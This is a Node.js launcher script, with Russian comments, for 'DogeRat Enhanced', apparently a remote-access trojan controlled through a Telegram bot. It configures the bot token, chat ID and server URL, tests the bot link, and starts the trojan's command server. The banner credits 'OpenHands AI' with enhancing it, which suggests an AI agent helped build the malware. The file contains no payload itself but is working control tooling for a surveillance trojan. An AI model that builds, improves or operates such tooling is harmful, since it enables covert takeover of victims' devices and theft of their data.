#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

// Цвета для консоли
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m'
};

// Логотип
const logo = `
${colors.cyan}${colors.bright}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗  ██████╗  ██████╗ ███████╗██████╗  █████╗ ████████║
║    ██╔══██╗██╔═══██╗██╔════╝ ██╔════╝██╔══██╗██╔══██╗╚══██╔══║
║    ██║  ██║██║   ██║██║  ███╗█████╗  ██████╔╝███████║   ██║  ║
║    ██║  ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗██╔══██║   ██║  ║
║    ██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║██║  ██║   ██║  ║
║    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝  ║
║                                                              ║
║                    ENHANCED EDITION                          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
${colors.reset}
`;

class EnhancedStarter {
    constructor() {
        this.configPath = path.join(__dirname, 'config', 'enhanced_config.json');
        this.dataPath = path.join(__dirname, 'data.json');
        this.serverProcess = null;
    }

    // Вывод логотипа
    showLogo() {
        console.clear();
        console.log(logo);
        console.log(`${colors.green}🚀 DogeRat Enhanced Control Panel${colors.reset}`);
        console.log(`${colors.yellow}📅 Version: 2.0.0 Enhanced${colors.reset}`);
        console.log(`${colors.blue}👨‍💻 Enhanced by: OpenHands AI${colors.reset}\n`);
    }

    // Проверка зависимостей
    checkDependencies() {
        console.log(`${colors.yellow}🔍 Checking dependencies...${colors.reset}`);
        
        const requiredFiles = [
            'package.json',
            'data.json',
            'enhanced_server.js'
        ];

        const requiredDirs = [
            'modules',
            'config',
            'uploads',
            'downloads'
        ];

        let allGood = true;

        // Проверка файлов
        requiredFiles.forEach(file => {
            if (fs.existsSync(path.join(__dirname, file))) {
                console.log(`${colors.green}✅ ${file}${colors.reset}`);
            } else {
                console.log(`${colors.red}❌ ${file} - Missing!${colors.reset}`);
                allGood = false;
            }
        });

        // Проверка директорий
        requiredDirs.forEach(dir => {
            const dirPath = path.join(__dirname, dir);
            if (fs.existsSync(dirPath)) {
                console.log(`${colors.green}✅ ${dir}/${colors.reset}`);
            } else {
                console.log(`${colors.yellow}⚠️  ${dir}/ - Creating...${colors.reset}`);
                fs.mkdirSync(dirPath, { recursive: true });
                console.log(`${colors.green}✅ ${dir}/ - Created!${colors.reset}`);
            }
        });

        return allGood;
    }

    // Проверка конфигурации
    checkConfiguration() {
        console.log(`\n${colors.yellow}⚙️  Checking configuration...${colors.reset}`);
        
        try {
            const data = JSON.parse(fs.readFileSync(this.dataPath, 'utf8'));
            
            if (data.token === 'your bot token') {
                console.log(`${colors.red}❌ Telegram bot token not configured!${colors.reset}`);
                console.log(`${colors.yellow}📝 Please edit data.json and add your bot token${colors.reset}`);
                return false;
            }
            
            if (data.id === 'your telegram chat id here') {
                console.log(`${colors.red}❌ Telegram chat ID not configured!${colors.reset}`);
                console.log(`${colors.yellow}📝 Please edit data.json and add your chat ID${colors.reset}`);
                return false;
            }
            
            console.log(`${colors.green}✅ Configuration looks good!${colors.reset}`);
            return true;
        } catch (error) {
            console.log(`${colors.red}❌ Error reading configuration: ${error.message}${colors.reset}`);
            return false;
        }
    }

    // Установка зависимостей
    async installDependencies() {
        console.log(`\n${colors.yellow}📦 Installing dependencies...${colors.reset}`);
        
        return new Promise((resolve) => {
            const npm = spawn('npm', ['install'], {
                stdio: 'inherit',
                cwd: __dirname
            });
            
            npm.on('close', (code) => {
                if (code === 0) {
                    console.log(`${colors.green}✅ Dependencies installed successfully!${colors.reset}`);
                    resolve(true);
                } else {
                    console.log(`${colors.red}❌ Failed to install dependencies!${colors.reset}`);
                    resolve(false);
                }
            });
        });
    }

    // Запуск сервера
    startServer() {
        console.log(`\n${colors.green}🚀 Starting Enhanced DogeRat Server...${colors.reset}\n`);
        
        this.serverProcess = spawn('node', ['enhanced_server.js'], {
            stdio: 'inherit',
            cwd: __dirname
        });
        
        this.serverProcess.on('close', (code) => {
            console.log(`\n${colors.yellow}📴 Server stopped with code: ${code}${colors.reset}`);
            process.exit(code);
        });
        
        this.serverProcess.on('error', (error) => {
            console.log(`${colors.red}❌ Server error: ${error.message}${colors.reset}`);
            process.exit(1);
        });
    }

    // Показать меню
    showMenu() {
        console.log(`\n${colors.cyan}📋 Available Options:${colors.reset}`);
        console.log(`${colors.white}1. 🚀 Start Enhanced Server${colors.reset}`);
        console.log(`${colors.white}2. ⚙️  Check Configuration${colors.reset}`);
        console.log(`${colors.white}3. 📦 Install Dependencies${colors.reset}`);
        console.log(`${colors.white}4. 🔧 Setup Wizard${colors.reset}`);
        console.log(`${colors.white}5. 📊 Show System Info${colors.reset}`);
        console.log(`${colors.white}6. 🔍 Test Connection${colors.reset}`);
        console.log(`${colors.white}7. 📝 View Logs${colors.reset}`);
        console.log(`${colors.white}8. ❌ Exit${colors.reset}\n`);
    }

    // Мастер настройки
    async setupWizard() {
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        console.log(`\n${colors.cyan}🔧 Setup Wizard${colors.reset}\n`);
        
        try {
            const data = JSON.parse(fs.readFileSync(this.dataPath, 'utf8'));
            
            // Запрос токена бота
            if (data.token === 'your bot token') {
                const token = await this.askQuestion(rl, '🤖 Enter your Telegram Bot Token: ');
                data.token = token;
            }
            
            // Запрос chat ID
            if (data.id === 'your telegram chat id here') {
                const chatId = await this.askQuestion(rl, '💬 Enter your Telegram Chat ID: ');
                data.id = chatId;
            }
            
            // Запрос хоста
            if (data.host === 'your render.com url here must use / after writing  url ex: https://google.com/') {
                const host = await this.askQuestion(rl, '🌐 Enter your server URL (optional, press Enter to skip): ');
                if (host.trim()) {
                    data.host = host;
                }
            }
            
            // Сохранение конфигурации
            fs.writeFileSync(this.dataPath, JSON.stringify(data, null, 4));
            console.log(`${colors.green}✅ Configuration saved successfully!${colors.reset}`);
            
        } catch (error) {
            console.log(`${colors.red}❌ Setup error: ${error.message}${colors.reset}`);
        } finally {
            rl.close();
        }
    }

    // Вспомогательная функция для вопросов
    askQuestion(rl, question) {
        return new Promise((resolve) => {
            rl.question(question, (answer) => {
                resolve(answer);
            });
        });
    }

    // Показать системную информацию
    showSystemInfo() {
        const os = require('os');
        
        console.log(`\n${colors.cyan}💻 System Information:${colors.reset}`);
        console.log(`${colors.white}Platform: ${os.platform()} ${os.arch()}${colors.reset}`);
        console.log(`${colors.white}Node.js: ${process.version}${colors.reset}`);
        console.log(`${colors.white}CPU: ${os.cpus()[0].model}${colors.reset}`);
        console.log(`${colors.white}Memory: ${Math.round(os.totalmem() / 1024 / 1024 / 1024)} GB${colors.reset}`);
        console.log(`${colors.white}Free Memory: ${Math.round(os.freemem() / 1024 / 1024 / 1024)} GB${colors.reset}`);
        console.log(`${colors.white}Uptime: ${Math.round(os.uptime() / 3600)} hours${colors.reset}`);
        console.log(`${colors.white}Network Interfaces: ${Object.keys(os.networkInterfaces()).join(', ')}${colors.reset}`);
    }

    // Тест подключения
    async testConnection() {
        console.log(`\n${colors.yellow}🔍 Testing connection...${colors.reset}`);
        
        try {
            const data = JSON.parse(fs.readFileSync(this.dataPath, 'utf8'));
            
            if (data.token === 'your bot token') {
                console.log(`${colors.red}❌ Bot token not configured!${colors.reset}`);
                return;
            }
            
            const TelegramBot = require('node-telegram-bot-api');
            const bot = new TelegramBot(data.token);
            
            const me = await bot.getMe();
            console.log(`${colors.green}✅ Bot connection successful!${colors.reset}`);
            console.log(`${colors.white}Bot Name: ${me.first_name}${colors.reset}`);
            console.log(`${colors.white}Bot Username: @${me.username}${colors.reset}`);
            
        } catch (error) {
            console.log(`${colors.red}❌ Connection test failed: ${error.message}${colors.reset}`);
        }
    }

    // Просмотр логов
    viewLogs() {
        console.log(`\n${colors.cyan}📝 Recent Logs:${colors.reset}\n`);
        
        const logFiles = [
            'command_history.log',
            'security.log',
            'server.log'
        ];
        
        logFiles.forEach(logFile => {
            const logPath = path.join(__dirname, logFile);
            if (fs.existsSync(logPath)) {
                console.log(`${colors.yellow}📄 ${logFile}:${colors.reset}`);
                try {
                    const content = fs.readFileSync(logPath, 'utf8');
                    const lines = content.split('\n').filter(line => line.trim());
                    const recentLines = lines.slice(-5);
                    
                    recentLines.forEach(line => {
                        console.log(`   ${line}`);
                    });
                    
                    if (lines.length > 5) {
                        console.log(`   ... and ${lines.length - 5} more lines`);
                    }
                } catch (error) {
                    console.log(`   ${colors.red}Error reading log: ${error.message}${colors.reset}`);
                }
                console.log('');
            }
        });
    }

    // Главный цикл
    async run() {
        this.showLogo();
        
        // Проверка зависимостей
        if (!this.checkDependencies()) {
            console.log(`${colors.red}❌ Some dependencies are missing!${colors.reset}`);
            process.exit(1);
        }
        
        // Интерактивное меню
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        
        while (true) {
            this.showMenu();
            
            const choice = await this.askQuestion(rl, `${colors.cyan}Select option (1-8): ${colors.reset}`);
            
            switch (choice.trim()) {
                case '1':
                    if (this.checkConfiguration()) {
                        rl.close();
                        this.startServer();
                        return;
                    }
                    break;
                    
                case '2':
                    this.checkConfiguration();
                    break;
                    
                case '3':
                    await this.installDependencies();
                    break;
                    
                case '4':
                    await this.setupWizard();
                    break;
                    
                case '5':
                    this.showSystemInfo();
                    break;
                    
                case '6':
                    await this.testConnection();
                    break;
                    
                case '7':
                    this.viewLogs();
                    break;
                    
                case '8':
                    console.log(`${colors.green}👋 Goodbye!${colors.reset}`);
                    rl.close();
                    process.exit(0);
                    break;
                    
                default:
                    console.log(`${colors.red}❌ Invalid option!${colors.reset}`);
            }
            
            // Пауза перед следующим меню
            await this.askQuestion(rl, `\n${colors.yellow}Press Enter to continue...${colors.reset}`);
            console.clear();
            this.showLogo();
        }
    }
}

// Обработка сигналов завершения
process.on('SIGINT', () => {
    console.log(`\n${colors.yellow}📴 Shutting down gracefully...${colors.reset}`);
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log(`\n${colors.yellow}📴 Received SIGTERM, shutting down...${colors.reset}`);
    process.exit(0);
});

// Запуск приложения
if (require.main === module) {
    const starter = new EnhancedStarter();
    starter.run().catch(error => {
        console.error(`${colors.red}❌ Fatal error: ${error.message}${colors.reset}`);
        process.exit(1);
    });
}

module.exports = EnhancedStarter;